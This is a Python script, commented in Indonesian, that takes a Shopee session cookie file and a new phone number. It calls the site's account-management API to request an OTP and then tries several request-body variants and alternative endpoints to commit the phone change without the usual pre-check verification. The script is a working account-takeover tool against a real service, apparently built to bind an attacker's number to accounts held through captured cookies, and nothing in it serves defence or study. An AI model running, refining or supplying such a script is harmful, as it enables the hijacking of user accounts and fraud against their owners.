# -*- coding: utf-8 -*-
"""cp_commit_direct.py — coba COMMIT langsung tanpa precheck.

Beberapa akun menerima commit_v2 hanya dengan change_phone_token + vcode_token.
Uji semua kombinasi body commit + endpoint commit alternatif.

Usage:
  python3 cp_commit_direct.py <ck> <newphone> [--otp=123456]
"""
import json, sys, urllib.request, urllib.error, time

CK = sys.argv[1] if len(sys.argv) > 1 else "ck_5th.txt"
NEWPHONE = sys.argv[2] if len(sys.argv) > 2 else "6283191104601"
OTP = None
for a in sys.argv:
    if a.startswith("--otp="):
        OTP = a.split("=", 1)[1]

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36")
ck = open(CK).read().strip()
CSRF = ""
for p in ck.split(";"):
    if p.strip().startswith("csrftoken="):
        CSRF = p.split("=", 1)[1].strip()
M = "/api/v4/account/management"
st = {}


def log(*a):
    print(*a, flush=True)


def call(path, body=None, method=None):
    h = {"Cookie": ck, "User-Agent": UA, "X-API-SOURCE": "pc",
         "X-Requested-With": "XMLHttpRequest",
         "Referer": "https://shopee.co.id/user/account/settings",
         "Content-Type": "application/json", "Accept": "application/json",
         "X-CSRFToken": CSRF, "X-Shopee-Language": "id"}
    d = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request("https://shopee.co.id" + path, data=d, headers=h,
                                 method=method or ("POST" if body is not None else "GET"))
    try:
        r = urllib.request.urlopen(req, timeout=50)
        return r.status, json.loads(r.read())
    except urllib.error.HTTPError as e:
        try:
            return e.code, json.loads(e.read())
        except Exception:
            return e.code, {}
    except Exception as ex:
        return 0, {"exc": str(ex)[:60]}


log(f"=== COMMIT DIRECT — {CK} → {NEWPHONE} ===")

s, j = call("/api/v4/account/basic/get_account_info")
d = j.get("data") or {}
log(f"[0] uid={d.get('userid')} phone_lama={d.get('phone')}")

# init
s, j = call(f"{M}/change_phone_init", {})
SEQ = (j.get("data") or {}).get("seq_no")
s, j2 = call(f"{M}/change_phone_init_v2", {})
D2 = j2.get("data") or {}
CPT = D2.get("change_phone_token") or ""
UT = D2.get("ivs_utoken") or ""
log(f"[1] seq={SEQ} cp={len(CPT)}B ut={len(UT)}B")

# send OTP (dapatkan vcode_token / otp_tracking_id)
log("\n[2] send OTP")
s, j = call("/api/v4/otp/send_vcode",
            {"phone": NEWPHONE, "channel": 1, "operation": 0,
             "force_channel": False, "supported_channels": [1], "seed": ""})
SE = j.get("data") or {}
VT = SE.get("otp_tracking_id") or SE.get("seed")
log(f"    err={j.get('error')} tracking={VT}")
st["send"] = SE

if j.get("error") != 0:
    log("    ⚠️ OTP gagal kirim, tetap coba commit")

# verify OTP kalau ada kode
if OTP:
    log(f"\n[3] verify OTP {OTP}")
    for p in ("/api/v4/otp/verify_vcode", f"{M}/verify_vcode"):
        s, j = call(p, {"phone": NEWPHONE, "vcode": OTP, "code": OTP,
                        "vcode_token": VT, "operation": 0})
        log(f"    {p.split('/')[-1]:14s} err={j.get('error')} {str(j.get('data'))[:110]}")
        if j.get("error") == 0:
            dd = j.get("data") or {}
            VT = dd.get("vcode_token") or dd.get("token") or VT
            st["verify"] = dd
            break
        time.sleep(0.5)

# COMMIT — semua varian
log("\n[4] commit_v2 — semua varian body")
variants = [
    ("cp_phone_vt", {"change_phone_token": CPT, "new_phone": NEWPHONE,
                     "vcode_token": VT}),
    ("cp_phone_vt_sig", {"change_phone_token": CPT, "new_phone": NEWPHONE,
                         "vcode_token": VT, "ivs_signature": "", "ivs_method": 2}),
    ("cp_vcode", {"change_phone_token": CPT, "vcode": OTP or "", "vcode_token": VT,
                  "new_phone": NEWPHONE}),
    ("phone_key", {"change_phone_token": CPT, "phone": NEWPHONE, "vcode_token": VT}),
    ("with_seq", {"change_phone_token": CPT, "new_phone": NEWPHONE,
                  "vcode_token": VT, "seq_no": SEQ}),
]
for name, b in variants:
    s, j = call(f"{M}/change_phone_commit_v2", b)
    e = j.get("error")
    mark = "★★" if e == 0 else "★ " if e not in (10002, 10012) else "  "
    log(f" {mark}[{name:16s}] err={e} {str(j.get('data'))[:130]}")
    st.setdefault("commit", []).append({"v": name, "err": e})
    if e == 0:
        st["commit_ok"] = {"v": name, "data": j.get("data")}
        log("    🟢🟢 COMMIT BERHASIL!")
        break
    time.sleep(0.6)

# endpoint commit alternatif
if not st.get("commit_ok"):
    log("\n[5] endpoint commit alternatif")
    for p in (f"{M}/change_phone_commit", "/api/v4/account/change_phone_commit_v2",
              f"{M}/change_phone"):
        s, j = call(p, {"change_phone_token": CPT, "new_phone": NEWPHONE,
                        "vcode_token": VT})
        log(f"    {p.split('/')[-1]:26s} {s} err={j.get('error')} {str(j.get('data'))[:100]}")
        if j.get("error") == 0:
            st["commit_ok"] = {"path": p, "data": j.get("data")}
            log("    🟢 BERHASIL")
            break
        time.sleep(0.5)

json.dump(st, open("cp_commit_state.json", "w"), indent=1)
log("\n=== HASIL ===")
log(f"  commit: {'✅ BERHASIL' if st.get('commit_ok') else '❌'}")
